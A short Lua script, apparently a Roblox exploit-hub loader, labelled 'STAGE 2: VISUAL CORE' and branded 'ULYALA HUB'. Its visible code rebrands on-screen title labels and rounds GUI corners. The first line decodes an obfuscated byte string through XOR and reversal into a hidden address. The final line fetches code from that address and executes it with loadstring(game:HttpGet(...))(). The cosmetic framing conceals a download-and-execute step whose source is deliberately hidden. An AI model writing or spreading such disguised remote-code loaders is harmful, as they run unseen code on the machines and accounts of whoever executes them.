
--[[ STAGE 2: VISUAL CORE ]]
local sSjJpKIN1sAjNg_="\113\156\177\099\185\104\150\172\100\216\170\213\148\210\204\212\133\193\194\197\254\235\232\246\227\160\220\205\016\015\007\003\011"local HjaVl9_re0uGtJhWYXu=159 local fq8pzULeBEI7NrKsN4FVr=143 local fuYmzLO_z6uhXOUJl=1 local EJwZ0zYfPcNOwyil0h9=4 local BQHbJ7jdqXkHp=25 local l7IFfDZqbdXi=true local yVhBwmGn2ybmfHfpoDeOti=bit32 and bit32.bxor if not yVhBwmGn2ybmfHfpoDeOti then yVhBwmGn2ybmfHfpoDeOti=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local kyC5sp9Y0lBRV4JM40xkxO={}for YH4ZBQ2sg9XeRuaoXT1=1,#sSjJpKIN1sAjNg_ do local Kj1rDOtdN4A8E_aUyn=string.byte(sSjJpKIN1sAjNg_,YH4ZBQ2sg9XeRuaoXT1)local EnoZjJyuFPTZDIPQo=(fq8pzULeBEI7NrKsN4FVr+(YH4ZBQ2sg9XeRuaoXT1*EJwZ0zYfPcNOwyil0h9)+BQHbJ7jdqXkHp)%256 if fuYmzLO_z6uhXOUJl==0 then Kj1rDOtdN4A8E_aUyn=(Kj1rDOtdN4A8E_aUyn-EnoZjJyuFPTZDIPQo)%256 kyC5sp9Y0lBRV4JM40xkxO[YH4ZBQ2sg9XeRuaoXT1]=string.char(yVhBwmGn2ybmfHfpoDeOti(Kj1rDOtdN4A8E_aUyn,HjaVl9_re0uGtJhWYXu))else Kj1rDOtdN4A8E_aUyn=yVhBwmGn2ybmfHfpoDeOti(Kj1rDOtdN4A8E_aUyn,HjaVl9_re0uGtJhWYXu)kyC5sp9Y0lBRV4JM40xkxO[YH4ZBQ2sg9XeRuaoXT1]=string.char((Kj1rDOtdN4A8E_aUyn-EnoZjJyuFPTZDIPQo)%256)end end local Xd_jIUUEytAVLN=table.concat(kyC5sp9Y0lBRV4JM40xkxO)if l7IFfDZqbdXi then Xd_jIUUEytAVLN=string.reverse(Xd_jIUUEytAVLN)end local _I2iBEhZK8ei2bRZ4Lo=Xd_jIUUEytAVLN
local HubName = "ULYALA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(_I2iBEhZK8ei2bRZ4Lo))()
